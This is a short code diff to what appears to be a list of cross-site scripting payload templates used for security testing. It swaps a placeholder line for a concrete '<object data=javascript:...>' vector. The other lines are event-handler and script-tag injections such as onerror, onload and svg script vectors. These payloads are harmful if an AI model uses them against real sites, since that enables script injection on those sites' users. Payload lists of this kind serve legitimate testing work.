@@ -3,7 +3,7 @@
 <img src=xx:x onerror=%alert% />
 <iframe onload=%alert%></iframe>
 <frameset onload=%alert%>
-<object data=%uri%>
+<object data=javascript:alert(9)></object>
 <svg onload=javascript:alert(2)//
 <video onerror=%uri%><source>
 <svg><script>%alert%</script>
